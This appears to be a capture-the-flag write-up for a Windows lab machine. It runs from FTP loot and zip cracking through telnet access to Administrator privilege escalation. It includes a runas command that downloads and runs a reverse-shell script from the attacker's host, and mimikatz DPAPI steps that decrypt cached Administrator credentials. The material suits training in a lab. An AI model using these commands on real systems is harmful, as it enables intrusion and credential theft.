## Intro

Tags: #windows #OSCPpath #WebApp #ftp #telnet #runas #DpapiCreds #easy

--------
# Reconnaissance

## Port scan

```shell
nmap -sC -sV -o nmap/access.nmap 10.10.10.98
```

```shell
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst:
|_  SYST: Windows_NT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## WebApp

![](MediaFiles/Pasted%20image%2020260927160046.png)
nothing further interesting here

## FTP

```shell
ftp access.htb
```
anonymous login is enabled, and there are two directories inside, download them recursively
```shell
wget -r --no-passive ftp://access.htb/
```
These are the files
```
Backups/backup.mdb
Engineer/Access Control.zip
```
trying to unzip the zip file, there seems to be password protected:
```shell
7z x "Access Control.zip"
```

```shell
Extracting archive: Access Control.zip
--
Path = Access Control.zip
Type = zip

Enter password (will not be echoed):
ERROR: Wrong password : Access Control.pst
```
check encryption method
```shell
7z l -slt "Access Control.zip"

Method = AES-256 Deflate
```
Also lets check the other file too
```shell
strings -n 8 backup.mdb
```
the results seem non readable, so its encrypted
```shell
strings -n 8 backup.mdb | sort -u > backup_wordlist
```
### Cracking zip file

Cracking the hash with **JohnTheRipper** and the created wordlist:
```shell
john Access_Control.hash --wordlist=Backups/backup_wordlist
```
successful! password found:
```
access4u@security
```

now decrypted the zip file with this password, and got a `.pst` file
convert it to readable format
```shell
readpst "Access Control.pst"
```

```shell
cat "Access Control.mbox"
```

```shell
Hi there,

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.

Regards,
John
```

#### creds obtained

```
security
4Cc3ssC0ntr0ller
```

## Telnet

Tried these creds we found against telnet, and it worked!

## Shell as security

```shell
telnet access.htb -l security
```
![](MediaFiles/Pasted%20image%2020260927155940.png)
grabbed user flag

## Stabilize telnet shell

```shell
powershell
powershell -File -
PS C:\Users\Public\Desktop> whoami
access\security
PS C:\Users\Public\Desktop> $env:os
Windows_NT
```

------
# Privesc

## User enumeration

![](MediaFiles/Pasted%20image%2020260927160148.png)

## Filesystem enumeration

we cant go to Administrator, but we can go to Public
![](MediaFiles/Pasted%20image%2020260927160228.png)

### Inspect `.lnk` file

lets view the `lnk`
![](MediaFiles/Pasted%20image%2020260927160315.png)
we could also inspect it with this oneliner:
```powershell
powershell -c "$WScript = New-Object -ComObject WScript.Shell; $SC = Get-ChildItem *.lnk; $WScript.CreateShortcut($sc)"
```

```powershell
FullName : C:\Users\Public\Desktop\ZKAccess3.5 Security System.lnk 
Arguments : /user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe" 
Description : 
Hotkey : 
IconLocation : C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico,0 
RelativePath : 
TargetPath : C:\Windows\System32\runas.exe WindowStyle : 1 
WorkingDirectory : C:\ZKTeco\ZKAccess3.5
```
interesting! we can see runas there, but most importantly it has the `savedcred` flag! that means that the creds are cached for `Administrator`

## Stored credentials

```powershell
cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
    Type: Domain Password
    User: ACCESS\Administrator
```
nice! this confirms that Administrator's credentials are cached, lets use them!

## 1st way - via runas

lets use this script to create a rev shell with nishang shell `Invoke-PowerShellTcp.ps1`
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
```shell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.247 -Port 4444
```
start local server 
```shell
python3 -m http.server 9001
```
now download and run the script via runas `Administrator`
```powershell
runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.247/Invoke-PowerShellTcp.ps1')"
```
got rev shell back!
![](MediaFiles/Pasted%20image%2020260927160512.png)

## 2nd way - dpapi creds

Since the creds are cached, we can extract those. found this https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/

### get master key

```powershell
C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001>dir /a 
Volume in drive C has no label. 
Volume Serial Number is 9C45-DBF0 

Directory of C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001 
```
found those two inside:
```
0792c32e-48a5-4fe3-8b43-d93d64590580
Preferred
```
next use certutil to b64 encode it
```powershell
certutil -encode 0792c32e-48a5-4fe3-8b43-d93d64590580 b64encoded_masterkey
```

```powershell
Input Length = 468 
Output Length = 700 
CertUtil: -encode command completed successfully.
```
lets view the result
```shell
type b64encoded_masterkey 

-----BEGIN CERTIFICATE----- AgAAAAAAAAAAAAAAMAA3ADkAMgBjADMAMgBlAC0ANAA4AGEANQAtADQAZgBlADMA LQA4AGIANAAzAC0AZAA5ADMAZAA2ADQANQA5ADAANQA4ADAAAAAAAAAAAAAFAAAA sAAAAAAAAACQAAAAAAAAABQAAAAAAAAAAAAAAAAAAAACAAAAnFHKTQBwjHPU+/9g uV5UnvhDAAAOgAAAEGYAAOePsdmJxMzXoFKFwX+uHDGtEhD3raBRrjIDU232E+Y6 DkZHyp7VFAdjfYwcwq0WsjBqq1bX0nB7DHdCLn3jnri9/MpVBEtKf4U7bwszMyE7 Ww2Ax8ECH2xKwvX6N3KtvlCvf98HsODqlA1woSRdt9+Ef2FVMKk4lQEqOtnHqMOc wFktBtcUye6P40ztUGLEEgIAAABLtt2bW5ZW2Xt48RR5ZFf0+EMAAA6AAAAQZgAA D+azql3Tr0a9eofLwBYfxBrhP4cUoivLW9qG8k2VrQM2mlM1FZGF0CdnQ9DBEys1 /a/60kfTxPX0MmBBPCi0Ae1w5C4BhPnoxGaKvDbrcye9LHN0ojgbTN1Op8Rl3qp1 Xg9TZyRzkA24hotCgyftqgMAAADlaJYABZMbQLoN36DhGzTQ 
-----END CERTIFICATE-----
```
lets paste it to our machine
```shell
cat b64encoded_masterkey | base64 -d > masterkey
```
do the same procedure for the credentials file on `C:\Users\security\AppData\Roaming\Microsoft\Credentials`
```powershell
C:\Users\security\AppData\Roaming\Microsoft\Credentials> certutil -encode 51AB168BE4BDB3A603DADE4F8CA81290 b64encoded_cred 

Input Length = 538 
Output Length = 800 
CertUtil: -encode command completed successfully.

C:\Users\security\AppData\Roaming\Microsoft\Credentials> type b64encoded_cred 

-----BEGIN CERTIFICATE----- AQAAAA4CAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAALsOSB6VI40+LQ9k9 ZFkFgAAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQA aQBhAGwAIABEAGEAdABhAA0ACgAAABBmAAAAAQAAIAAAAPW7usJAvZDZr308LPt/ MB8fEjrJTQejzAEgOBNfpaa8AAAAAA6AAAAAAgAAIAAAAPlkLTI/rjZqT3KT0C8m 5Ecq3DKwC6xqBhkURY2t/T5SAAEAAOc1Qv9x0IUp+dpf+I7c1b5E0RycAsRf39nu WlMWKMsPno3CIetbTYOoV6/xNHMTHJJ1JyF/4XfgjWOmPrXOU0FXazMzKAbgYjY+ WHhvt1Uaqi4GdrjjlX9Dzx8Rou0UnEMRBOX5PyA2SRbfJaAWjt4jeIvZ1xGSzbZh xcVobtJWyGkQV/5v4qKxdlugl57pFAwBAhDuqBrACDD3TDWhlqwfRr1p16hsqC2h X5u88cQMu+QdWNSokkr96X4qmabp8zopfvJQhAHCKaRRuRHpRpuhfXEojcbDfuJs ZezIrM1LWzwMLM/K5rCnY4Sg4nxO23oOzs4q/ZiJJSME21dnu8NAAAAAY/zBU7zW C+/QdKUJjqDlUviAlWLFU5hbqocgqCjmHgW9XRy4IAcRVRoQDtO4U1mLOHW6kLaJ vEgzQvv2cbicmQ== 
-----END CERTIFICATE-----
```
lets paste it to our machine too
```shell
cat b64encoded_cred | base64 -d > credentials
```

### Decrypt master key

lets use mimikatz
```shell
mimikatz # dpapi::masterkey /in:\users\ch3ckm8\masterkey /sid:S-1-5-21-953262931-566350628-63446256-1001 /password:4Cc3ssC0ntr0ller
```

```shell
**MASTERKEYS** dwVersion : 00000002 - 2 szGuid : {0792c32e-48a5-4fe3-8b43-d93d64590580} dwFlags : 00000005 - 5 dwMasterKeyLen : 000000b0 - 176 dwBackupKeyLen : 00000090 - 144 dwCredHistLen : 00000014 - 20 dwDomainKeyLen : 00000000 - 0 [masterkey] **MASTERKEY** dwVersion : 00000002 - 2 salt : 9c51ca4d00708c73d4fbff60b95e549e rounds : 000043f8 - 17400 algHash : 0000800e - 32782 (CALG_SHA_512) algCrypt : 00006610 - 26128 (CALG_AES_256) pbKey : e78fb1d989c4ccd7a05285c17fae1c31ad1210f7ada051ae3203536df 613e63a0e4647ca9ed51407637d8c1cc2ad16b2306aab56d7d2707b0c77422e7de39eb8bdfcca550 44b4a7f853b6f0b3333213b5b0d80c7c1021f6c4ac2f5fa3772adbe50af7fdf07b0e0ea940d70a12 45db7df847f615530a93895012a3ad9c7a8c39cc0592d06d714c9ee8fe34ced5062c412 [backupkey] **MASTERKEY** dwVersion : 00000002 - 2 salt : 4bb6dd9b5b9656d97b78f114796457f4 rounds : 000043f8 - 17400 algHash : 0000800e - 32782 (CALG_SHA_512) algCrypt : 00006610 - 26128 (CALG_AES_256) pbKey : 0fe6b3aa5dd3af46bd7a87cbc0161fc41ae13f8714a22bcb5bda86f24 d95ad03369a5335159185d0276743d0c1132b35fdaffad247d3c4f5f43260413c28b401ed70e42e0 184f9e8c4668abc36eb7327bd2c7374a2381b4cdd4ea7c465deaa755e0f53672473900db8868b428 327edaa [credhist] **CREDHIST INFO** dwVersion : 00000003 - 3 guid : {009668e5-9305-401b-ba0d-dfa0e11b34d0} [masterkey] with password: 4Cc3ssC0ntr0ller (normal user) key : b360fa5dfea278892070f4d086d47ccf5ae30f7206af0927c33b13957d44f0149a128391 c4344a9b7b9c9e2e5351bfaf94a1a715627f27ec9fafb17f9b4af7d2 sha1: bf6d0654ef999c3ad5b09692944da3c0d0b68afe
```

### Decrypt credential

```shell
dpapi::cred /in:\users\ch3ckm8\credentials
```

```
**BLOB** dwVersion : 00000001 - 1 guidProvider : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb} dwMasterKeyVersion : 00000001 - 1 guidMasterKey : {0792c32e-48a5-4fe3-8b43-d93d64590580} dwFlags : 20000000 - 536870912 (system ; ) dwDescriptionLen : 0000003a - 58 szDescription : Enterprise Credential Data algCrypt : 00006610 - 26128 (CALG_AES_256) dwAlgCryptLen : 00000100 - 256 dwSaltLen : 00000020 - 32 pbSalt : f5bbbac240bd90d9af7d3c2cfb7f301f1f123ac94d07a3cc012038135 fa5a6bc dwHmacKeyLen : 00000000 - 0 pbHmackKey : algHash : 0000800e - 32782 (CALG_SHA_512) dwAlgHashLen : 00000200 - 512 dwHmac2KeyLen : 00000020 - 32 pbHmack2Key : f9642d323fae366a4f7293d02f26e4472adc32b00bac6a061914458da dfd3e52 dwDataLen : 00000100 - 256 pbData : e73542ff71d08529f9da5ff88edcd5be44d11c9c02c45fdfd9ee5a531 628cb0f9e8dc221eb5b4d83a857aff13473131c927527217fe177e08d63a63eb5ce5341576b33332 806e062363e58786fb7551aaa2e0676b8e3957f43cf1f11a2ed149c431104e5f93f20364916df25a 0168ede23788bd9d71192cdb661c5c5686ed256c8691057fe6fe2a2b1765ba0979ee9140c010210e ea81ac00830f74c35a196ac1f46bd69d7a86ca82da15f9bbcf1c40cbbe41d58d4a8924afde97e2a9 9a6e9f33a297ef2508401c229a451b911e9469ba17d71288dc6c37ee26c65ecc8accd4b5b3c0c2cc fcae6b0a76384a0e27c4edb7a0ecece2afd9889252304db5767bbc3 dwSignLen : 00000040 - 64 pbSign : 63fcc153bcd60befd074a5098ea0e552f8809562c553985baa8720a82 8e61e05bd5d1cb8200711551a100ed3b853598b3875ba90b689bc483342fbf671b89c99 Decrypting Credential: * volatile cache: GUID:{0792c32e-48a5-4fe3-8b43-d93d64590580};KeyHash:bf6d0654e f999c3ad5b09692944da3c0d0b68afe **CREDENTIAL** credFlags : 00000030 - 48 credSize : 000000f4 - 244 credUnk0 : 00002004 - 8196 Type : 00000002 - 2 - domain_password Flags : 00000000 - 0 LastWritten : 8/22/2018 9:18:49 PM unkFlagsOrSize : 00000038 - 56 Persist : 00000003 - 3 - enterprise AttributeCount : 00000000 - 0 unk0 : 00000000 - 0 unk1 : 00000000 - 0 TargetName : Domain:interactive=ACCESS\Administrator UnkData : (null) Comment : (null) TargetAlias : (null) UserName : ACCESS\Administrator CredentialBlob : 55Acc3ssS3cur1ty@megacorp Attributes : 0
```
here are the extracted creds from the above snippet
```
UserName : ACCESS\Administrator 
CredentialBlob : 55Acc3ssS3cur1ty@megacorp
```
then login via telnet
